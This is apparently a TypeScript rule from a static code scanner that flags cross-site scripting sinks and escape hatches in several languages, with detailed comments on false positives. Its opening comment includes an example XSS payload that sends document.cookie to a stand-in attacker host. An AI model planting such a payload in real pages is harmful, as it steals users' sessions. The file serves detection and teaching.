/**
 * CROSS-SITE SCRIPTING - XSS  (CWE-79, OWASP A05:2025 - Injection)
 *
 * WHAT THE BUG IS, in plain language:
 * A browser reads HTML as instructions. `<script>` doesn't display the word
 * "script" - it runs code. So if your page inserts user-supplied text into HTML
 * without escaping it, the user can supply `<script>...</script>` and their code
 * runs inside YOUR page, with your user's session, cookies and permissions.
 *
 *     element.innerHTML = "Welcome " + userName;
 *
 * If `userName` is `<img src=x onerror=fetch('//evil/'+document.cookie)>`, the
 * browser dutifully loads a broken image, fires the error handler, and posts
 * the victim's session cookie to the attacker. The user never clicked anything.
 *
 * WHY IT'S CALLED "CROSS-SITE": the attacker's code runs on your site's origin,
 * so the browser trusts it exactly as much as it trusts you. Same-origin policy
 * - the rule that stops evil.com reading your bank tab - is on the attacker's
 * side now.
 *
 * THE FIX:
 *   - Use the text API, not the HTML API: `textContent` instead of `innerHTML`.
 *     `textContent` never parses tags; `<script>` becomes visible characters.
 *   - When you genuinely need HTML, escape it (< becomes &lt;) or run it through
 *     a sanitiser like DOMPurify that removes scripts and event handlers.
 *   - Template engines that auto-escape (React JSX, Jinja2, Go html/template)
 *     do this for you - which is exactly why the "escape hatches" in those
 *     libraries (dangerouslySetInnerHTML, |safe, template.HTML) are the places
 *     this rule watches.
 *
 * ESCAPING vs SANITISING (they are different, and people mix them up):
 * ESCAPING turns markup into visible text - safest, use it by default.
 * SANITISING keeps the markup but strips the dangerous parts - only when the
 * user is genuinely allowed to send HTML, and only with a real library.
 */

import type { Node } from 'web-tree-sitter';
import type { LanguageId } from '../parse/languages.js';
import { asAssignment, asCall, type Rule, type RuleHit } from './contract.js';
import { analyzeStringExpression, looksLikeHtml } from './lib/strings.js';
import { partsAreGuarded } from './lib/guards.js';
import { analyzeHtmlSafety, supportsHtmlSafety, type HtmlSafety } from './lib/html-safety.js';

/** Assigning to these properties parses the value as HTML. */
const HTML_SINK_PROPERTIES: Record<LanguageId, readonly string[]> = {
  // `__html` is the inner key of React's dangerouslySetInnerHTML={{ __html: x }},
  // which is where the actual value lands.
  javascript: ['innerHTML', 'outerHTML', 'dangerouslySetInnerHTML', '__html', 'srcdoc'],
  typescript: ['innerHTML', 'outerHTML', 'dangerouslySetInnerHTML', '__html', 'srcdoc'],
  python: [],
  java: [],
  go: [],
  // No DOM, so no properties that parse an assignment as HTML.
  c: [],
  cpp: [],
  // `echo` is not a property assignment - it is a PHP statement. The shape
  // layer captures `echo $x;` as an assignment whose TARGET is the `echo`
  // keyword itself, which lets the same rule cover it without inventing a
  // third shape kind. See ASSIGNMENT_QUERIES.php in engine/shapes.ts.
  php: ['echo', 'print'],
};

/** Calls that write raw HTML, or that switch a template engine's escaping OFF. */
const HTML_SINK_CALLS: Record<LanguageId, readonly string[]> = {
  javascript: ['write', 'writeln', 'insertAdjacentHTML', 'html', 'append', 'prepend', 'after', 'before'],
  typescript: ['write', 'writeln', 'insertAdjacentHTML', 'html', 'append', 'prepend', 'after', 'before'],
  python: ['mark_safe', 'Markup', 'HttpResponse', 'render_template_string', 'format_html'],
  java: ['print', 'println', 'write', 'printf', 'format', 'append'],
  go: ['HTML', 'HTMLAttr', 'JS', 'Write', 'Fprintf', 'Fprint', 'Fprintln'],
  php: ['printf', 'vprintf', 'print_r', 'var_dump'],
  /*
   * Deliberately EMPTY, and this is the interesting empty list in the table.
   *
   * C absolutely can serve HTML - that is what CGI was - and `printf` writing
   * to stdout in a CGI binary is a genuine XSS sink. But nothing in the source
   * distinguishes a CGI program from any other C program: printf to stdout is
   * what every command-line tool on earth does. Listing printf here would
   * report a "cross-site scripting" finding on `printf("done\n")` in a build
   * script, which is the VS Code RegExp.exec mistake in a new costume.
   *
   * So C gets no XSS coverage, the matrix says "not implemented" rather than
   * showing a rule that never fires, and the reason is recorded here. Note
   * that a tainted printf format IS still reported - by the format-string
   * rule, for the bug it actually is.
   */
  c: [],
  cpp: [],
};

/**
 * Calls whose danger is unconditional because their whole purpose is to bypass
 * escaping. These are reported even when the argument is a plain variable,
 * because "trust me, this HTML is fine" is itself the risky decision.
 */
/**
 * Argument types that cannot possibly carry markup, whatever they are handed to.
 *
 * Found by auditing this tool's own findings across five real libraries: five
 * of the six XSS findings in Flask were escape-hatch calls whose arguments were
 * entirely constant - `render_template_string("{{ config }}", config=42)`.
 * Saying "do not escape this" about the number 42 is not a risky promise, it is
 * not a promise at all.
 */
const CONSTANT_NODES = new Set([
  'integer',
  'float',
  'number',
  'true',
  'false',
  'none',
  'null',
  'undefined',
  'boolean',
  'decimal_integer_literal',
  'decimal_floating_point_literal',
]);

const ESCAPE_HATCHES = new Set([
  'mark_safe',
  'Markup',
  'render_template_string',
  'insertAdjacentHTML',
]);

/**
 * Run the safety proof where we have one, and return null where we do not.
 * A null means "this language is not covered by the proof", which the callers
 * must treat as "report", never as "safe".
 */
function judgeSafety(
  value: Node,
  ctx: { readonly file: { readonly root: Node } },
  language: LanguageId,
): HtmlSafety | null {
  if (!supportsHtmlSafety(language)) return null;
  return analyzeHtmlSafety(value, ctx.file.root, language);
}

/**
 * Turn the proof's result into a sentence a beginner can act on.
 *
 * The point is to name the SPECIFIC sub-expression that is still unescaped,
 * rather than gesturing at the whole statement. On a 40-line template literal
 * that is the difference between a usable finding and a shrug.
 */
function describeSafety(safety: HtmlSafety | null, dynamicParts: readonly string[]): string {
  if (!safety) {
    // No proof available for this language - fall back to naming what was spliced in.
    return dynamicParts.length
      ? `It splices in ${dynamicParts.slice(0, 3).map((p) => `\`${p}\``).join(', ')}, and no ` +
          `escaping is visible at this line. `
      : 'No escaping or sanitiser call is visible at this line. ';
  }

  const named = safety.unproven.slice(0, 3).map((p) => `\`${p}\``).join(', ');
  const escaped = safety.escapers.length
    ? `We did confirm ${safety.escapers.map((e) => `\`${e}\``).join(', ')} runs on the other ` +
      `spliced-in values, so this is not a blanket complaint about the line. `
    : '';

  if (safety.unproven.length === 0) {
    return `${escaped}No escaping is visible for the value that is spliced in. `;
  }

  return (
    `${escaped}What we could NOT prove safe: ${named}` +
    `${safety.unproven.length > 3 ? ` (and ${safety.unproven.length - 3} more)` : ''}. ` +
    `Each of those reaches the HTML parser exactly as written. `
  );
}

/**
 * Calls that PRODUCE escaped text, per language. Used only to let an escape
 * hatch off when every value inside it went through one.
 *
 * Go's list is the `html` and `html/template` package functions; the taint
 * dictionary already knew these names as sanitisers, but the signature path
 * had no way to ask.
 */
/**
 * A SHAPE RULE FOR ESCAPERS WE HAVE NEVER MET.
 *
 * Scanning Jenkins - 2,064 Java files - produced two flow-verified XSS findings
 * on lines that read
 *
 *     Functions.htmlAttributeEscape(redirectUrl)
 *
 * Jenkins escapes with its own helper, and the named list above knows
 * `escapeHtml` and `htmlEscape` but not `htmlAttributeEscape`. Punishing the
 * fix, in Java, on the sixth occasion this project has done it.
 *
 * The lesson is the one already learned about SOURCES and never applied to
 * their mirror image: escapers are PER-FRAMEWORK. WordPress spells them
 * `esc_html`, Jenkins spells them `htmlAttributeEscape`, and the next codebase
 * will spell them a third way. Enumerating names loses that race forever.
 *
 * So names are matched by SHAPE as well: a call whose name says it escapes or
 * encodes AND names a markup context. Both halves are required, which is what
 * keeps `escapeShellArg` and `escapeSql` out - those escape for a different
 * grammar, and treating them as HTML-safe is exactly the kind-confusion this
 * engine exists to avoid.
 *
 * The explicit lists stay. They are precise, they carry intent, and this is a
 * fallback for the framework nobody has scanned yet.
 */
const ESCAPER_SHAPE =
  /^\s*(?:[\w.\\$]*\b)?(\w*(?:escape|encode|sanitiz|sanitis)\w*)\s*\(/i;
const MARKUP_CONTEXT = /html|xml|markup|attribute|\battr\b|ecma|javascript|\bjs\b|entities|tag/i;

export function looksLikeAnEscaperCall(text: string): boolean {
  const match = ESCAPER_SHAPE.exec(text);
  if (!match?.[1]) return false;
  return MARKUP_CONTEXT.test(match[1]);
}

const ESCAPER_CALLS: Partial<Record<LanguageId, RegExp>> = {
  go: /^\s*(?:[\w.]*\b(?:EscapeString|HTMLEscapeString|HTMLEscaper|HTMLEscape|JSEscapeString|JSEscaper|URLQueryEscaper|QueryEscape|PathEscape)\s*\()/,
  python: /^\s*(?:[\w.]*\b(?:escape|quote|quote_plus|escape_silent)\s*\()/,
  java: /^\s*(?:[\w.]*\b(?:escapeHtml|escapeHtml4|escapeXml|htmlEscape|encodeForHTML)\s*\()/,
  // PHP's native escapers plus WordPress's, which is what almost all PHP on the
  // internet actually calls. See the long note in taint/dictionaries.ts.
  php: /^\s*(?:@?\\?[\w\\]*\b(?:htmlspecialchars|htmlentities|strip_tags|urlencode|rawurlencode|json_encode|wp_json_encode|intval|floatval|absint|number_format|esc_html|esc_attr|esc_url|esc_url_raw|esc_js|esc_textarea|esc_xml|esc_html__|esc_html_e|esc_html_x|esc_attr__|esc_attr_e|esc_attr_x|wp_kses|wp_kses_post|wp_kses_data|tag_escape|sanitize_html_class|sanitize_text_field|sanitize_textarea_field|sanitize_title|sanitize_email|sanitize_key|sanitize_user|e)\s*\()/,
};

/** Go writer names, and what a destination has to look like to be a page. */
const GO_WRITER_NAMES: ReadonlySet<string> = new Set([
  'Write', 'WriteString', 'Fprintf', 'Fprint', 'Fprintln',
]);
const GO_PAGE_WRITER = /^w$|writer|\brw\b|resp|response|ResponseWriter/i;

export const xssRule: Rule = {
  id: 'xss',
  name: 'Unescaped value written into HTML',
  cwe: 'CWE-79',
  owasp: 'A05:2025 Injection',
  severity: 'high',
  explanation:
    'A browser reads HTML as instructions, so text inserted into a page without ' +
    'escaping can bring its own <script> tag or event handler and run as your site. ' +
    'It then has your user\'s session and cookies. The fix is to use a text API ' +
    '(textContent) instead of an HTML API (innerHTML), or to escape/sanitise the ' +
    'value before it becomes markup.',
  limitations:
    'UNVERIFIED (signature-based): we confirmed a value reaches an HTML-writing sink ' +
    'and that at least one part of it could not be proven safe. We did NOT confirm ' +
    'that part is attacker-controlled. In JavaScript and TypeScript we resolve local ' +
    'variables and local render helpers and drop the finding when EVERY spliced-in ' +
    'value is a literal, a number, or the result of a known escaper - so a finding ' +
    'here names the parts that survived that check. Values escaped in another file, ' +
    'by an imported helper, or by a framework we do not model still read as unproven. ' +
    'DELIBERATE GAP: an escaper is trusted BY NAME (escapeHtml, DOMPurify.sanitize ' +
    'and similar). We do not verify that such a function actually escapes anything, ' +
    'with one exception - a local definition that returns its argument unchanged is ' +
    'rejected. A local `escapeHtml` that escapes only some characters would be ' +
    'believed. Python, Java and Go are not covered by that check at all and report ' +
    'on shape alone.',
  shapes: ['call', 'assignment'],
  support: {
    javascript: {
      status: 'implemented',
      note: 'Covers innerHTML/outerHTML/srcdoc assignment, document.write, insertAdjacentHTML, jQuery .html/.append, and React dangerouslySetInnerHTML.',
    },
    typescript: {
      status: 'implemented',
      note: 'Identical to JavaScript, including .tsx files via the tsx grammar.',
    },
    python: {
      status: 'partial',
      note: 'PARTIAL: Django/Flask escape hatches (mark_safe, Markup, render_template_string, HttpResponse with built HTML) are detected. Template files themselves (.html, .jinja) are NOT parsed at all, so `{{ x|safe }}` inside a template is invisible.',
    },
    java: {
      status: 'partial',
      note: 'PARTIAL: only servlet-style out.print/response.getWriter().write with built HTML. JSP files and Thymeleaf/Freemarker templates are not parsed.',
    },
    go: {
      status: 'partial',
      note: 'PARTIAL: template.HTML/template.JS conversions and w.Write/fmt.Fprintf with built HTML. Note that Go\'s html/template escapes automatically, so the template.HTML() conversion is the main real risk - which is exactly what we check.',
    },
    php: {
      status: 'partial',
      note: 'PARTIAL: `echo`/`print` of a built string, and printf/vprintf/print_r/var_dump. The escaper proof that covers JavaScript does NOT run here, so a value passed through htmlspecialchars in the same expression still reports on shape alone - the data-flow pass is what clears those. Blade and Twig templates are not parsed at all, so `{!! $x !!}` inside one is invisible.',
    },
    c: {
      status: 'not-implemented',
      note:
        "C can serve HTML - that is what CGI was - but nothing in the source distinguishes a CGI binary from any other program, and printf to stdout is what every command-line tool does. Listing it would report cross-site scripting on a build script's progress message. A tainted printf FORMAT is still reported, by the format-string rule, for the bug it actually is.",
    },
    cpp: {
      status: 'not-implemented',
      note:
        'Not implemented for the same reason as C: nothing in the source separates a web-serving binary from an ordinary program, so listing the output calls would report cross-site scripting on every console message. A tainted printf format is still reported by the format-string rule.',
    },
  },
  check(shape, ctx): RuleHit | null {
    const language = ctx.language;

    /* ---- Assignment into an HTML-parsing property ---- */
    const assignment = asAssignment(shape);
    if (assignment) {
      if (!HTML_SINK_PROPERTIES[language].includes(assignment.targetName)) return null;
      const built = analyzeStringExpression(assignment.value, language);
      // A hard-coded HTML string is fine - nobody can inject into a constant.
      if (!built.isDynamic) return null;

      /* Before shouting, do the work: can every spliced-in value be proven
       * incapable of carrying markup? See lib/html-safety.ts for why this
       * exists - the short version is that the old text claimed no escaper was
       * visible on lines where the escaper was four characters away. */
      const safety = judgeSafety(assignment.value, ctx, language);
      if (safety?.proven) return null;
      /*
       * The same escaper proof the CALL branch does. It has to be here as well
       * because PHP's `echo` is modelled as an assignment target, and `echo
       * esc_html( $x )` is 2,547 of WordPress's 2,971 XSS findings - i.e. the
       * single biggest false-positive cluster this project has ever produced
       * sat on the one branch that had no proof step at all.
       */
      const assignEscapers = ESCAPER_CALLS[language];
      if (
        built.dynamicParts.length > 0 &&
        built.dynamicParts.every(
          (part) => (assignEscapers?.test(part) ?? false) || looksLikeAnEscaperCall(part),
        )
      ) {
        return null;
      }

      /*
       * A VALIDATION GUARD. `ctype_alnum($name)` proves the value carries no
       * angle bracket or quote, so inside that branch it cannot inject markup.
       * A guard establishes its fact in the CONTROL FLOW rather than by
       * transforming the value, which is why the escaper proof above cannot see
       * it. See lib/guards.ts - the predicate list is deliberately tiny, because
       * a guard rule that fires too often costs silence rather than precision.
       */
      if (partsAreGuarded(assignment.value, built.dynamicParts, language)) return null;

      /*
       * `echo $x` IS NOT `innerHTML = x`, AND THEY HAD THE SAME SEVERITY.
       *
       * WordPress produced 1,940 findings on this branch. 868 of them were a
       * bare variable - `echo $post_link;` - with no markup visible, no source
       * visible, and nothing to prove in either direction. Those are not false
       * positives. They are honest. They are also useless at that volume: 868
       * repetitions of "I cannot prove this is safe" carries the same
       * information as "WordPress echoes a lot of variables", and it buried the
       * 64 findings that DID have a traced path underneath it.
       *
       * The asymmetry that makes this fixable: `element.innerHTML = x` names
       * HTML in the sink itself - the browser will parse it, guaranteed. `echo`
       * is print. It is only HTML because something downstream happens to be a
       * browser, and when the expression contains no markup either, there are
       * two guesses stacked on each other rather than one fact.
       *
       * The CALL branch already refuses to fire without visible markup, for
       * exactly this reason ("otherwise every logger lights up"). This is that
       * same gate, applied as a RANK rather than a silence, because a variable
       * holding HTML assembled elsewhere is a real WordPress bug shape and
       * dropping it would be deciding for the reader.
       */
      const printSink = language === 'php';
      const noMarkupVisible = printSink && !looksLikeHtml(built.literalText);

      return {
        node: assignment.node,
        ...(noMarkupVisible ? { severity: 'low' as const } : {}),
        message: noMarkupVisible
          ? `Unescaped value written by \`${assignment.targetName}\` (no source traced)`
          : `Value assigned to \`${assignment.targetName}\` is parsed as HTML`,
        reasoning: noMarkupVisible
          ? `\`${assignment.targetName}\` writes this value out without escaping it, and if the ` +
            `page is HTML the browser reads whatever it contains as markup. That is the whole ` +
            `of what we know. There is NO literal HTML at this line and NO attacker-controlled ` +
            `source was traced into it, so this is not evidence of a bug - it is the absence of ` +
            `a proof of safety, ranked low to say so. ${describeSafety(safety, built.dynamicParts)}` +
            `If the value is text, wrap it in esc_html(). If it is meant to be markup, wp_kses() ` +
            `states which tags you intended. A finding on this line with a traced path would be ` +
            `reported separately and would rank far above it.`
          : `Assigning to \`${assignment.targetName}\` makes the browser parse the value as ` +
            `HTML, so any tags or event handlers inside it run. The value here is not a ` +
            `fixed string - it was built via ${built.mechanism}. ` +
            describeSafety(safety, built.dynamicParts) +
            `\`textContent\` would render the same value harmlessly as text.`,
      };
    }

    /* ---- Call that writes HTML or disables escaping ---- */
    const call = asCall(shape);
    if (call) {
      if (!HTML_SINK_CALLS[language].includes(call.calleeName)) return null;

      /*
       * THE SIGNATURE RULES KEEP THEIR OWN SINK LISTS, and the scoping sweep
       * that fixed the taint dictionary did not touch them.
       *
       * A fixture written to prove `fmt.Fprintf(buf, ...)` had stopped being
       * cross-site scripting still reported `digest.Write([]byte(...))` on a
       * SHA-256 hash - because this list, not the dictionary, matched it. Same
       * defect, second surface, found only because the fixture was checked
       * rather than assumed.
       *
       * Go's writer names get the receiver test the dictionary already applies.
       * `w`, `rw` and anything response-shaped writes a page; a buffer, a file
       * and a hash do not.
       */
      if (language === 'go' && GO_WRITER_NAMES.has(call.calleeName)) {
        const destination =
          call.calleeName.startsWith('Fprint') ? (call.args[0]?.text ?? '') : call.receiverText;
        if (!GO_PAGE_WRITER.test(destination)) return null;
      }

      const isEscapeHatch = ESCAPE_HATCHES.has(call.calleeName);

      for (const rawArg of call.args) {
        // `render_template_string("{{ config }}", config=42)` - a keyword
        // argument wraps its value, and `analyzeStringExpression` cannot see a
        // string type on the wrapper, so it reported "opaque" and the escape
        // hatch fired on the number 42. Unwrap to the value being passed.
        const arg =
          rawArg.type === 'keyword_argument' || rawArg.type === 'argument'
            ? (rawArg.childForFieldName('value') ??
               rawArg.namedChildren.filter((c): c is Node => c !== null).pop() ??
               rawArg)
            : rawArg;
        const built = analyzeStringExpression(arg, language);

        // `Markup("<html>")` with a fixed string is safe - there is nothing for
        // an attacker to put inside a constant. Measured against Flask's own
        // source, requiring a dynamic argument removed most of the noise from
        // this branch without losing a single real escape-hatch misuse.
        if (isEscapeHatch && !built.isDynamic) continue;
        // A constant is a constant whatever its type. Numbers, booleans and
        // None have no room inside them for an attacker to write markup, and
        // an escape hatch handed one is not a promise about anything.
        if (isEscapeHatch && CONSTANT_NODES.has(arg.type)) continue;

        /*
         * AN ESCAPE HATCH WHOSE EVERY VALUE IS ESCAPED IS THE CORRECT CODE.
         *
         * Nine of gitea's seventeen Go XSS findings were `template.HTML(...)`
         * wrapped around a string in which every single interpolation had
         * already been through `html.EscapeString`. That is not a misuse of the
         * hatch - in Go it is the ONLY way to return assembled markup from a
         * template helper, and escaping each part first is exactly what you are
         * supposed to do.
         *
         * Reporting it is the worst kind of false positive, because the thing
         * being reported IS the fix: a developer who acts on the finding deletes
         * the escaping. This project has hit that shape three times now
         * (unserialize allowed_classes, yaml SafeLoader, SQL placeholders), and
         * it is the failure mode worth spending code to avoid.
         *
         * TEXTUAL, AND SAYING SO. The JS/TS path proves this properly through
         * lib/html-safety.ts, which resolves identifiers and judges function
         * bodies. This asks a smaller question - does every spliced-in part
         * READ as a call to a known escaper - and it is weaker for it: an
         * escaper reached through a variable (`safe := html.EscapeString(x)`
         * then `template.HTML("<b>" + safe)`) is not recognised and still
         * reports. Under-claiming, which is the right direction to be wrong in.
         */
        const escapers = ESCAPER_CALLS[language];
        const isEscaped = (part: string): boolean =>
          (!!escapers && escapers.test(part)) || looksLikeAnEscaperCall(part);
        const everyPartEscaped =
          built.dynamicParts.length > 0 && built.dynamicParts.every(isEscaped);
        if (everyPartEscaped) continue;

        if (isEscapeHatch) {
          return {
            node: call.node,
            message: `\`${call.calleeText}()\` marks a value as trusted HTML, disabling escaping`,
            reasoning:
              `\`${call.calleeText}()\` exists to tell the template engine "do not escape ` +
              `this - it is safe HTML". That promise is only true if the value contains no ` +
              `attacker-controlled text. Here the value is ` +
              `${built.isDynamic ? `built at runtime via ${built.mechanism}` : 'a runtime value'}, ` +
              `so the promise is being made about text nobody has checked.`,
          };
        }

        // For generic writers, require the text to actually look like markup -
        // otherwise every logger and every fmt.Fprintf in the repo lights up.
        if (!built.isDynamic) continue;
        if (!looksLikeHtml(built.literalText)) continue;

        const safety = judgeSafety(arg, ctx, language);
        if (safety?.proven) continue;

        return {
          node: arg,
          message: `HTML written by ${call.calleeText}() is built with ${built.mechanism}`,
          reasoning:
            `\`${call.calleeText}()\` writes its argument into the response or the document. ` +
            `The argument contains literal HTML ("${built.literalText.replace(/\s+/g, ' ').trim().slice(0, 60)}") ` +
            `and was assembled via ${built.mechanism}. ` +
            describeSafety(safety, built.dynamicParts) +
            `Markup inside an unescaped value reaches the browser as instructions.`,
        };
      }
    }

    return null;
  },
};
